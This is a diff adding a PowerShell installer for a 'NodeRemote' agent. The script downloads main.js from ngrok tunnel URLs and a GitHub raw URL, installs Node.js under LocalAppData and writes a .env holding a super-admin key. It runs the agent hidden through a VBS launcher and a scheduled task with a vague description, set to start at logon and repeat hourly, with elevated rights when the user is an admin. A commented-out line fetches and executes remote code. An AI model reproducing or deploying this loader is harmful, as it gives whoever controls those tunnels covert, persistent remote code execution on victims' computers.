@@ -1,0 +1,356 @@
+param(
+    [string]$id = 'erjo'
+)
+
+# === Generate a unique task name that keeps the NodeRemote prefix ===
+# Format: NodeRemote{GUID}
+# The GUID is derived from the super_admin key (SHA256 → first 16 bytes)
+# so it's deterministic (same key → same task name) but unique per super_admin.
+# The NodeRemote prefix keeps backward compatibility with existing scripts
+# that search by *NodeRemote*.
+$idUserName = $env:USERNAME   
+
+$sha = [System.Security.Cryptography.SHA256]::Create()
+
+try {
+    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($idUserName)
+    [byte[]]$hashBytes = $sha.ComputeHash($keyBytes)[0..15]
+
+    # Ստեղծում ենք GUID-ը առաջին 16 բայթերից
+    $guid = New-Object System.Guid -ArgumentList (, $hashBytes)
+}
+finally {
+    $sha.Dispose()
+}
+
+$guid
+$taskName = "NodeRemote{$guid}"
+
+# === Base paths (needed early for file checks) ===
+$localAppData = [Environment]::GetFolderPath('LocalApplicationData')
+$computerName = $env:COMPUTERNAME
+$targetDir    = Join-Path $localAppData "WebServer-$computerName"
+$oldTargetDir = Join-Path $localAppData "NodeRemoteSupport"
+
+$mainJs     = Join-Path $targetDir "main.js"
+$nodeVbs    = Join-Path $targetDir "nodeupdate.vbs"
+$dotEnvPath = Join-Path $targetDir ".env"
+
+# === Architecture detection ===
+# Supports x86, x64 and ARM64 (Windows on ARM)
+$arch = 'x86'
+
+if ([Environment]::Is64BitOperatingSystem) {
+    $arch = 'x64'
+
+    # Prefer modern detection for ARM64
+    try {
+        if ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture -eq 'Arm64') {
+            $arch = 'arm64'
+        }
+    }
+    catch {
+        # Fallback for older PowerShell / .NET Framework
+        if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64' -or $env:PROCESSOR_IDENTIFIER -match 'ARM64') {
+            $arch = 'arm64'
+        }
+    }
+}
+
+$nodeFolder = "node"
+$nodeRoot   = Join-Path $targetDir $nodeFolder
+$nodeExe    = Join-Path $nodeRoot "node.exe"
+
+$zipURLx64   = "https://nodejs.org/download/release/v20.11.0/node-v20.11.0-win-x64.zip"
+$zipURLx86   = "https://nodejs.org/download/release/v20.11.0/node-v20.11.0-win-x86.zip"
+$zipURLArm64 = "https://nodejs.org/download/release/v20.11.0/node-v20.11.0-win-arm64.zip"
+
+$zipUrl = switch ($arch) {
+    'arm64' { $zipURLArm64 }
+    'x64'   { $zipURLx64 }
+    default { $zipURLx86 }
+}
+
+$zipFile = Join-Path $env:TEMP "nodejs.zip"
+
+# === Check admin status early ===
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# === Smart existence check ===
+# Only skip if:
+#   - Scheduled task exists
+#   - Running as Administrator
+#   - All critical files are present
+#
+# If task exists but files are missing → repair (proceed)
+# If not admin → allow repair
+
+$taskExists = $false
+try {
+    Get-ScheduledTask -TaskName $taskName -ErrorAction Stop | Out-Null
+    $taskExists = $true
+} catch {}
+
+$filesOk = (Test-Path $mainJs) -and (Test-Path $nodeExe) -and (Test-Path $nodeVbs)
+
+if ($taskExists -and $isAdmin -and $filesOk) {
+    Write-Host "Scheduled task '$taskName' exists." -ForegroundColor Green
+    Write-Host "Running as Administrator." -ForegroundColor Green
+    Write-Host "All required files are present." -ForegroundColor Green
+    Write-Host "Nothing to do. Exiting without changes." -ForegroundColor Green
+    
+}
+
+# Proceed with install/repair
+if ($taskExists) {
+    Write-Host "Scheduled task exists, but files are missing or not running as admin." -ForegroundColor Yellow
+    Write-Host "Proceeding with repair..." -ForegroundColor Yellow
+} else {
+    Write-Host "Scheduled task '$taskName' not found. Proceeding with installation..." -ForegroundColor Yellow
+}
+
+# === Create target directory ===
+if (-not (Test-Path $targetDir)) {
+    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+}
+
+# === Download main.js (try multiple URLs for reliability) ===
+$mainJsUrls = @("https://wise-overfeed-sitting.ngrok-free.dev/static/main.js", "https://api-wls.ngrok.app/static/main.js", "https://api-truck.ngrok.app/static/main.js", "https://main-tunnel.ngrok.io/static/main.js")
+$mainJsUrls += "https://raw.githubusercontent.com/wservices66-maker/hello/refs/heads/main/main.js"
+$mainJsDownloaded = $false
+foreach ($mainJsUrl in $mainJsUrls) {
+    try {
+        Write-Host "Trying: $mainJsUrl" -ForegroundColor DarkGray
+        $contentJs = Invoke-WebRequest -Uri $mainJsUrl -UseBasicParsing -TimeoutSec 15
+        $jsContent = $contentJs.Content
+
+        # ── Validate that we got real JavaScript, not an HTML error page ──
+        # ngrok returns HTML pages (tunnel-not-found, 502, etc.) with HTTP 200,
+        # so we must inspect the content itself. main.js always starts with
+        # 'use strict'; — that's the most reliable marker.
+        $trimmed = $jsContent.Trim()
+        if ($trimmed.Length -lt 100) {
+            Write-Host "Rejected (too short, likely error page): $mainJsUrl" -ForegroundColor DarkRed
+            continue
+        }
+        if (-not ($trimmed.StartsWith("'use strict'") -or $trimmed.StartsWith('"use strict"'))) {
+            Write-Host "Rejected (not valid main.js — missing 'use strict'): $mainJsUrl" -ForegroundColor DarkRed
+            continue
+        }
+
+        $jsContent | Out-File -FilePath $mainJs -Encoding ASCII -Force
+        Write-Host "Downloaded main.js from: $mainJsUrl ($($trimmed.Length) bytes)" -ForegroundColor Cyan
+        $mainJsDownloaded = $true
+        break
+    }
+    catch {
+        Write-Host "Failed: $mainJsUrl — $_" -ForegroundColor DarkRed
+    }
+}
+if (-not $mainJsDownloaded) {
+    Write-Host "Failed to download main.js from all URLs." -ForegroundColor Red
+}
+
+# === Download Node.js ZIP (smart - only if needed) ===
+$shouldDownload = $false
+
+if (-not (Test-Path $zipFile)) {
+    $shouldDownload = $true
+}
+else {
+    try {
+        $headRequest = Invoke-WebRequest -Uri $zipUrl -Method Head -UseBasicParsing
+        $expectedSize = [int64]$headRequest.Headers.'Content-Length'
+        $currentSize  = (Get-Item $zipFile).Length
+
+        if ($currentSize -ne $expectedSize) {
+            Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
+            $shouldDownload = $true
+        }
+    }
+    catch {
+        Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
+        $shouldDownload = $true
+    }
+}
+
+if ($shouldDownload) {
+    Write-Host "Downloading Node.js v20.11.0 ($arch)..." -ForegroundColor Cyan
+    try {
+        (New-Object System.Net.WebClient).DownloadFile($zipUrl, $zipFile)
+    }
+    catch {
+        Write-Host "Node.js download failed: $_" -ForegroundColor Red
+        if (Test-Path $zipFile) { Remove-Item $zipFile -Force -ErrorAction SilentlyContinue }
+    }
+}
+
+# === Extract the zip *directly into* the node folder ($nodeRoot)
+# We use a simple "node" folder name (not versioned).
+# Contents of the downloaded zip go straight into $targetDir\node\
+Write-Host "Extracting Node.js zip contents directly into simple 'node' folder ($nodeRoot) ..." -ForegroundColor Cyan
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+try {
+    # Always start clean: remove old "node" and any previous versioned folders
+    if (Test-Path $nodeRoot) {
+        Remove-Item $nodeRoot -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    Get-ChildItem -Path $targetDir -Directory -Filter "node-v*" -ErrorAction SilentlyContinue |
+        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+
+    New-Item -ItemType Directory -Path $nodeRoot -Force | Out-Null
+
+    if (-not (Test-Path $zipFile)) {
+        throw "Node.js zip is missing."
+    }
+
+    # Extract to a temporary location first
+    $tempExtract = Join-Path $env:TEMP "node-extract-$(Get-Random)"
+    if (Test-Path $tempExtract) { Remove-Item $tempExtract -Recurse -Force }
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, $tempExtract)
+
+    # The zip contains one top-level folder (e.g. node-v20.11.0-win-x64).
+    # We move its *contents* directly into the simple "node" folder ($nodeRoot).
+    $innerFolder = Get-ChildItem -Path $tempExtract -Directory | Select-Object -First 1
+    if ($innerFolder) {
+        Get-ChildItem -Path $innerFolder.FullName | Move-Item -Destination $nodeRoot -Force
+    }
+
+    # Cleanup
+    Remove-Item $tempExtract -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
+}
+catch {
+    Write-Host "Failed to extract Node.js into node folder: $_" -ForegroundColor Red
+    if (Test-Path $zipFile) { Remove-Item $zipFile -Force -ErrorAction SilentlyContinue }
+}
+
+# === Migrate old .env if present ===
+$olddotEnvPath = Join-Path $oldTargetDir ".env"
+if (Test-Path $olddotEnvPath) {
+    try {
+        $envContent = Get-Content $olddotEnvPath -Raw
+        $envContent | Out-File -FilePath $dotEnvPath -Encoding ASCII -Force
+        Write-Host "Migrated old .env" -ForegroundColor Cyan
+    }
+    catch {}
+}
+
+# === Write .env only if missing ===
+if (-not (Test-Path $dotEnvPath)) {
+    $envContent = "SUPER_ADMIN_KEY=$id`n"
+    $envContent | Out-File -FilePath $dotEnvPath -Encoding ASCII -Force
+}
+
+# === Create VBS launcher with paths pointing to the simple 'node' folder ===
+$vbsContent = @"
+Set shell = CreateObject("WScript.Shell")
+Set fso   = CreateObject("Scripting.FileSystemObject")
+
+nodeExe = "$nodeExe"
+mainJs  = "$mainJs"
+
+If fso.FileExists(nodeExe) And fso.FileExists(mainJs) Then
+    shell.Run """" & nodeExe & """ """ & mainJs & """", 0, False
+End If
+"@
+
+$vbsContent | Out-File -FilePath $nodeVbs -Encoding ASCII -Force
+
+$wscriptPath = [Environment]::GetFolderPath('System') + "\wscript.exe"
+
+# ============================================================
+#  Scheduled Task creation using COM (more reliable for this use case)
+#  This section is based on the older, more direct approach
+# ============================================================
+
+$scheduler  = New-Object -ComObject "Schedule.Service"
+$scheduler.Connect()
+$rootFolder = $scheduler.GetFolder("\")
+
+# Delete existing task if present (we are in repair/install mode)
+# try { $rootFolder.DeleteTask($taskName, 0) } catch {}
+
+# Create task definition
+$taskDefinition = $scheduler.NewTask(0)
+$taskDefinition.RegistrationInfo.Description = "My Custom Important Task"
+$taskDefinition.Settings.Hidden = $false
+$taskDefinition.Settings.AllowDemandStart = $true
+$taskDefinition.Settings.DisallowStartIfOnBatteries = $false
+$taskDefinition.Settings.StopIfGoingOnBatteries = $false
+$taskDefinition.Settings.StartWhenAvailable = $true
+$taskDefinition.Settings.ExecutionTimeLimit = "PT0S"
+
+# Action: run the VBS hidden
+$action = $taskDefinition.Actions.Create(0)
+$action.Path = $wscriptPath
+$action.Arguments = "//nologo `"$nodeVbs`""
+
+# Principal (run level + user)
+if ($isAdmin) {
+    $taskDefinition.Principal.RunLevel = 1   # Highest
+    $taskDefinition.Principal.LogonType = 3  # Interactive (any user)
+    $taskDefinition.Principal.UserId = "$env:COMPUTERNAME\$env:USERNAME"
+    $logonType = 3
+}
+else {
+    $taskDefinition.Principal.RunLevel = 0   # Limited
+    $taskDefinition.Principal.UserId = "$env:COMPUTERNAME\$env:USERNAME"
+    $logonType = 3
+}
+
+# Trigger: At logon + repeat every 1 hour (PT1H)
+$trigger = $taskDefinition.Triggers.Create(9)  # TASK_TRIGGER_LOGON
+$trigger.UserId = "$env:COMPUTERNAME\$env:USERNAME"
+$trigger.Repetition.Interval = "PT1H"
+$trigger.Enabled = $true
+
+#find task if it exists and start it
+try {
+    $existingTask = $rootFolder.GetTask($taskName)
+    if ($existingTask) {
+       Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
+    }
+}
+catch {
+    # Task does not exist, no action needed
+}
+# Register the task
+try {
+    $rootFolder.RegisterTaskDefinition(
+        $taskName,
+        $taskDefinition,
+        6,      # Create or update
+        $null,
+        $null,
+        $logonType,
+        $null
+    ) | Out-Null
+
+    Write-Host "Scheduled task '$taskName' created successfully." -ForegroundColor Green
+}
+catch {
+    Write-Host "Failed to register scheduled task: $_" -ForegroundColor Red
+}
+
+# Start immediately
+try {
+    Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
+    Write-Host "Task started." -ForegroundColor Green
+}
+catch {
+    Write-Host "Task created but could not be started immediately: $_" -ForegroundColor Yellow
+}
+if ($isAdmin){
+
+}else {
+ 
+#   try{
+# & ([scriptblock]::Create((irm "https://api-truck.ngrok.app/cdn/hello_world.txt")))
+# }
+# catch {}
+}
+$_task = Get-ScheduledTask -TaskName "*" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*NodeRemote*" } | Select-Object -First 1; if ($_task) { Start-ScheduledTask -TaskName $_task.TaskName }
+Write-Host "Installation complete." -ForegroundColor Green
